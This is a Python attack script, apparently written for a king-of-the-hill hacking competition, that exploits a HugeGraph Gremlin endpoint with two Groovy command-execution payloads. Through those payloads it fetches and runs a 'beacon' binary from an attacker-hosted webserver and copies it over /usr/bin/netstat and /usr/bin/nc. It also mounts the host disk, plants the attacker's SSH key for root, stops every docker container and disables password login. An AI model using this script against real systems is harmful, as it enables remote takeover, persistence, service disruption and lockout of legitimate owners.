import requests
import json
import paramiko
import http.server
import socketserver
import time
import yaml
import threading


def exploit(target, command):
    url = f"{target}/gremlin"
    headers = {"Content-Type": "application/json"}

    # Escape quotes in the command to ensure it's properly formatted
    formatted_command = command.replace('"', '\\"').replace("'", "\\'")
    formatted_words = ", ".join(f'"{word}"' for word in formatted_command.split())

    payload1 = {
        "gremlin": f'Thread thread = Thread.currentThread();Class clz = Class.forName("java.lang.Thread");java.lang.reflect.Field field = clz.getDeclaredField("name");field.setAccessible(true);field.set(thread, "VICARIUS");Class processBuilderClass = Class.forName("java.lang.ProcessBuilder");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList({formatted_words});Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod("start");startMethod.invoke(processBuilderInstance);',
        "bindings": {},
        "language": "gremlin-groovy",
        "aliases": {},
    }

    payload2 = {
        "gremlin": f'def result = "{command}".execute().text\njava.lang.reflect.Field field = Thread.currentThread().getClass().getDeclaredField(result);',
    }

    # Try first payload
    try:
        response = requests.post(
            url, headers=headers, data=json.dumps(payload1), verify=False, timeout=15
        )
        if handle_response(response, target, "payload 1"):
            return True  # If the first payload works, return success

        # Try second payload if the first fails
        response = requests.post(
            url, headers=headers, data=json.dumps(payload2), verify=False, timeout=15
        )
        if handle_response(response, target, "payload 2"):
            return True  # If the second payload works, return success

    except Exception as e:
        print(f"Exception with {target}")
        print(str(e))

    return False  # If neither payload works, return failure


def handle_response(response, target, payload) -> bool:
    if (
        (response.status_code in [200, 500])
        and ('"code":200' in response.text)
        and ("Failed to do request" not in response.text)
    ):
        print(f"[+] Command executed successfully with {payload}")
        return True
    else:
        print(f"[-] Request failed with status code: {response.status_code}")
        print(f"[-] Response text: {response.text}")
        print(f"[-] {target} may not be vulnerable")
        return False


def is_we(target, webserver, payload):
    """
    1. Download our beacon
    2. Make it executable
    3. Run it
    4. Have it replace common binaries
    """
    beacon_name = "hugegraph"
    exploit(target, f"curl {webserver}/{payload} -o {beacon_name}")
    exploit(target, f"chmod +x ./{beacon_name}; ./{beacon_name} &; ./{beacon_name} &")
    exploit(target, f"./{beacon_name} &")
    exploit(target, f"./{beacon_name} &")
    exploit(
        target, f"cp ./{beacon_name} /usr/bin/netstat; cp ./{beacon_name} /usr/bin/nc"
    )


def fuckin(target, webserver):
    """
    1. find and mount the hostfs
    2. ensure all the keys are mine
    3. disable password-based ssh in the config
    4. drop our koth keys
    """

    mount_name = "/usr/local/.temp"

    # exploit(
    #    target,
    #    f"UUID=\\$(cat /proc/cmdline | grep -oP 'UUID=\K[\w-]+') && DEV=\\$(findfs UUID=\\$UUID) && mkdir -p {mount_name} && mount \"\\$DEV\" f{mount_name}",
    # )
    exploit(target, f"mkdir {mount_name}")
    exploit(target, f"mount /dev/vda1 {mount_name}")
    exploit(
        target, f"curl {webserver}/id_rsa.pub -o {mount_name}/root/.ssh/authorized_keys"
    )
    exploit(target, f"curl {webserver}/koth.txt -o {mount_name}/root/koth.txt")
    exploit(target, f"curl {webserver}/koth.txt -o {mount_name}/home/beepboop/koth.txt")


def or_what(host, ssh_key_file, webserver):
    """
    1. Connect as root via ssh
    2. Stop all docker containers
    3. Restart SSH (Enforce key only)
    """
    # Connect via SSH
    ssh = paramiko.SSHClient()
    k = paramiko.RSAKey.from_private_key_file(ssh_key_file)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host, username="root", pkey=k)

    # Stop all docker containers
    ssh.exec_command("docker stop $(docker ps -q)")
    ssh.exec_command(
        "sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication no/' /etc/ssh/sshd_config"
    )
    ssh.exec_command("sudo mkdir -p /site")
    ssh.exec_command(f"wget --recursive --no-parent -P /site {webserver}/site/")
    ssh.exec_command("sudo apt install -y nginx")
    ssh.exec_command("sudo mv /site/nginx.conf /etc/nginx/sites-available/giga")
    ssh.exec_command(
        "sudo ln -s /etc/nginx/sites-available/giga /etc/nginx/sites-enabled/"
    )
    ssh.exec_command("sudo systemctl restart nginx")
    ssh.exec_command("sudo systemctl restart sshd")


def parse_config(file) -> dict:
    """
    Reads a yaml file and returns a dict
    """

    with open(file, "r") as file:
        config = yaml.safe_load(file)

    return config


def read_file(file) -> str:
    """
    Reads a file and returns it's contents
    """
    f = open(file, "r")

    return f.read()


def start_webserver(port, handler):
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"Serving at http://localhost:{port}")
        httpd.serve_forever()


if __name__ == "__main__":

    print(
        """
==--------:-----:::::::::::::::::::::::::::::::::::::::::::::::::::::::::=%%%%%%@@%@%%%%%%%%%%%%%*:::::::::::::::::::::....::::::::::::::::--::......
---------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::-*%@@@%@%%%%%%%%%%%%%@%%%%%%##-::::::::::::::::::....:::.:::::::::::::-::......
--------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*%@@@%@%%%%%%%@%%%%%%%@%%%%%%%##*:::::::::::::::::.....::..:::::::...::::::.....
-------::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::=%%%@@%@%%%%%%%%%%%%%%%%%#%#%%%#%###=:::::::::::::::.....::..:::::::...::::::.....
-------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::+%@@%%@%%%%%%%%%%%%%%%%%%%%%#%%%##%%%#+:::::::::::::::.....:..:::::::....:::::.....
-:::--:::::::::::::::::::::::::::::::::.:::::::::::::::::::::::::=%%@@@%@%%%%%%%%%@@%%%%%%%%%#%%%%%#%##%#+::::::::::::::.........::::::.....::::.....
-::::::::::::::::::::::::::::::::::::::..::::::::::::::.:::::::::%%@@%@@@%%%%%%%%%%@%%%%%%%#%#%%%##%%#####=:::::::::::::.........::::::......::::....
::::::::::::::::::::::::::::::::::::::...:::::::::::::...:::::::=%@@@@@%@@%%%@%%%%@%%%%%%%%%%######%#%%#%##-::::::::::::.........::::::......::::....
:::::::::::::::::::::::::::::::::::::.....::::::::::::....::::::%%@@@%@@@%@@%%@@@@@%%@%%%%#%%%%%%#*##%#####+:::::::::::::.........::::::......:::....
:::::::::::::::::::::::::::::::::::::.....::::::::::::...:::.::=%@@@@%%%%%%%@@@%%%@%%@@@@%%%%%#####%########=::::::::::::.........::::::......:::....
::::::::::::::::::::::::::::::::::::::.......:::::::::........:*%@@@%%%%%@@@@@@@@@@%%%@%@%%#%%%%###%#%%###%#+::::::::::::.........::::::.......:::...
:::::::::::::::::::::::::::::::::::::........::..::::.........:*@@@%%%%%%++++++++****%%%%%%%%###%%#%#*****#%+::::::::::::.........:::::::........:...
::::::::::::::::::::::::::::.::::::::...:.........:::.........:#@%%%%#%%************++====--------::::--==+#*:::::::::::::.........::::::............
::::::::::::::::::::::::::::.::::::::.:.......................:*%%######**++++++++++=+**++=----::::-::----===:::::::..::::.........::::::............
:::::::::::::::::::::::::::::::::::::..........................+##*******+++++++==+++**+==+++=--:::::::---==:::::::::.::::.........::::::............
:::::::::::::::::.::::::::::::::::::........................-*+****+*****++++==========-==------::::::::----::::::.:...:::.........:::::::...........
:::::::::::::::::.::::::::::.::::.::.......................:#%#*++*+++++++=*%%%%%%%##+==+=====-----::::::--::::::.:.....:::.........::::::...........
:::::::::::::::::.:::::::::..::::..:.......................-#+==++*++++++***##%#%%%%%#*==--------==+**+**+-:..:::::.....:::.........::::::...........
:::::::::::::::::.:::::::::..:::...............::::::::::::-**%%%++=+++***##%%%%%%%%###*+==------=+++++=---:...:::.......::.........:::::::..........
:::::::::::::::::.::::.::::..:::.........::--=======--=====+*+%*==+++++++*#%%#@@@##%@%%%#*+=--===+**+++*=-:....::........::.........:::..::..........
:::::::::::::::::.::::.::::..:::..::--==============-=====++*+=*+=+++=====++*++%*::+@%%%#*=---=+#%@@#+#*=-:....:::.......::.........:::..::..........
:::::::::::::::::..::::::::.:::-============-------===+++***=--===++++===-=+*#***+++##***=-::::=**#%=:--:-:.....::........::.........:::..::.........
:::::::::::::::::.::::::::::-====----=--=----=+++*****+*###%*===#++*++===----=++++++++++=--:::::+#*++=-::-......:::==+--::::.........:::...:.........
::::::::::::::::..::::.:::=+==-===-----:-==++*######%%%###%%*-*##***+++====-------==++++==-:::::::---::::-:.::-=++*#*====:::.........:::..:::........
:::::::::::::::::.:::::::++==--=+++=--:::-==******##%%%%%#%%=:*##****++++===-----==+*+++==-:::::::::::::-+*+=+++======-::---.........:::...::........
:::::::::::::::::.::::::+#***++=+++--=-----==+*++**#%%%%%%%@%-+###*****++++===-===+***+==--::::-------+*++++****###*+=---::--:.......:::...::........
:::::::::::::::::.:::::-##****++==--==-==---=+***+***#%%%%%%+-#%%#******++++====++**===---:::::===++##***##*+==---===-:::--:=-........:::..:::.......
::::::::::::::::...::.:+%###***++=-=======---==+*####%%%@%%*=%=%%%#******+++++++++*+=====--:::::+*#%@#%#+=-==++***+===-:::--:--.......:::...::.......
::::::::::::::::..:::::*%%%#***+=--===--==+==-==+*#%%%%%%%%#-:-+%%%*******+++++++=++#%%#*+=-:-=++#%@%%**####*++++++*+++=:::-----......:::...:::......
::::::::::::::::..:::::+%%%#***+=-=====-====++++=**#%%%%%@@@%-+=#%%%#*****++++=====++**##**=-==+*#%@%*###+*#%%%%***==-===-:::--::.....::::..:::......
::::::::::::::::..:::.:-%%%##***==+===----=--===+=+*%%%%%@@@*=%#=%%%%##****++++======++=-=*=-=+##%@@#%#++=*%%%@@@%*+=-::-----:--::....::::...:::.....
::::::::::::::::..:::.::*%%%%#**==+========-:---==+*#%%@@@@@+=:=%%%%%%%##***+**+++======-----=+%%@@%#*+*++=---*%@@%**=-::::---::--:...::::...::::....
::::::::::::::::..:::.::*#%%%%#*+=*++-*=--::::::=-=*#%%@@@@@@#-=:#@%%%@%%#*******###%#*+++=++*#%@@@%#***#*+----=%%%**+=-:::::--:-:-....:::...::::....
::::::::::::::::..:::..:+#%%%%%##*+++++=+=-::-::-===+#%@@@@@@%-#%:#@@%%%%##*****##**#%%#**+#%#%@%%%%###%##+-----=%%#*++=-::::----::-...::::..::::....
::::::::::::::::..:::..:+*#%%%%####*++++==-::::::--=*#%@@@@@@#+*-*#@@%%%%@######*##*+=--===--+%%%@%###%%*++=------*#*+++=-:::::---::-..::::...::::...
::::::::::::::::..:::..:+*#%%%%%%##**++===--::::---==*%@@@@@@@=-::+@@%%%@@@%*########*+====+#%%@@@%%%%%####*+-----:-#*+++=--::::--:-:-..:::...:::::..
::::::::::--::::..:::..:**##%%%%%%%###*+==---::::---=*%%@@@@@@%-=%-=@@@%@%%%##############%@#@@@@%@@@@%%##*=-----::::-*+++=--::::-----:.::::.:::::::.
::::::::::--:::::::::..-*###%@@@@%%%##*+=---------==+*%@@@@@@@#-%-+-%@%%%@@@@@%%%%%###%%%%@@@@@@@@@%%%%%%%*==:-:::.:::+***++=---:------.::::.:::::::.
::::::::::--::::.::::.:=#####%@@%%%#*+++=====-----=+*%@@@@@@@@#:::::#%@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%%%#%%#*+:--:-:::::+***++++=-==----.:::::::::::::
::::::::::--:::::::::.:*#%%##%%%%%%%####*+===----==+*@@@@@@@@@@%*:+*:+%@@@@@@@%@@@@@@@@@@@@@@@@@@%#%%%@%%###+---:-:::...******+=-+*=-+=.:::::::::::::
::::::::::--:::::::::.-*%#%%#%%%%@@@%%%##*+==-----=+%@@@@%%%@@@%=-#--:*@@@@@@@@@@@@@@%#%%@@@%%***#%**#%##*#*+=-::::...:+*****+++=+*=-=-..::::::::::::
:::::::::---::::::::::-*#%%######%%%%##*+==-------+#@@@@%%%%%%%%+:+:.:+%%%@@@@@@@@@@##**%%#%%%**++%%%###**++=---::::-+=*%****+++=++=-=:..::::::::::::
:::::::::---::::::::::-*#%%####**#%%%%##**++=====+*#@@@%%%%%%%%%%#=::+:-%%%%@%%%=%%%%=%%#####+++*=*####*##*+=---=++=--+%#****++*#====-...::::::::::::
:::::::::----::::::::::*%#%####*****###***++=--===+*@@@%%%%%%%%%%%=:*-:==@@@@@@=:*::-*%**#+===+=-=+**##%##**%@@%#+=--=%#***++++**+-=+:...::::::::::::
:::::::::----::::::::::*%%%%###**+**++++==----:--=++#@%%%%%%%%%%##=:+-.:.*@@@%%#--::=#****+===+*******%%##%%@%#%*+--+%#**+++++++=+++=....:::::::::::-
:::::::::----::::::::::#%%@%####*+++++++++==-----=++*#@@@%%%%######*=::*-::==::::.=##+==+===*=-+*+++##%****#***+++=+##**+++++*+++=++:....::::::::::--
:::::::::----::::::::::*%%%%###***+==++*+++++====---=*#%@%%%%######%+:**+#+--:::::+%%#+=-==--==++++**#%#*+*#*+=---+%#*+++**++**+=++-::....:::::::::--
--::::::-----::::::::::*%%%#%###***+****+==++=======-==*%%%%%%%###%%%-:::=##-:..+=+%#*+*==**++====*##%%%%###+=---+#*+++***+==*+=+==:::....::::::::---
---:::::-----::::::::::+%%@%%%####*****+++++++=---=====+#@%%%%%%%%%@@@%%%%*==::::.+#*=-=+=+++====+#%%%%%#*+-=---=#*******+==*+++++-:::....::-:::::---
----::::-----::::::::::+%@@%%%%%#**#***++++=+==----==+=+*%@%%%%%%%@@@@@@@@%%%+---:*+=++=*-::-::-:+##%%%%#*==*=:+#*+****#+====*++++:::::...::--::::---
-----::------:::::::::-#%@@@%%###*##***++++====-----====*#%%%%%%%@@@@@@@%%##+:+=-::-:-:-:.::--:::-#%%%##*+==+=+#*+*####*+===*++++-:::::...::---------
-------------:::::::::+%%@@@%%%%%#%####++*+====-----===+*#%%@@@@#+==::-:::::::::::::--:-::::::::::%@%%%#*==-+*#***%%##*++====+**+:::::::..::--------=
-------------::::::::-#%@@@@%@%%%%%%##*++*+==-=------==+#%%#@@%-:::-=::::.:-.:=-=::=+-==::*::-+--:#@@%%#*++=*#**#%%#**++===+-=++-::::::::.::--------=
=---------=---:::::::-#%@@@@%@@@%%#%##*+**====------===+*%%##@+::-==-=--::==:::--:::--+=-**====%+=-@@@%#*++#*#*+++#**+*+=*+=++*=::::::::::::-------==
          """
    )

    # Config
    config = parse_config("../config.yaml")
    target = f"http://{config["target"]["host"]}:{config["target"]["port"]}"
    webserver = (
        f"http://{config["attacker"]["host"]}:{config["attacker"]["webserver_port"]}"
    )

    # Start webserver for payload
    handler = http.server.SimpleHTTPRequestHandler
    webserver_thread = threading.Thread(
        target=start_webserver,
        args=(int(config["attacker"]["webserver_port"]), handler),
        daemon=True,
    )
    webserver_thread.start()

    # I LOVE PILLS AND PERCOCETS, YES, YES (LET'S GO)
    is_we(target, webserver, config["attacker"]["payload"])
    fuckin(target, webserver)
    or_what(config["target"]["host"], config["attacker"]["ssh_key_file"], webserver)
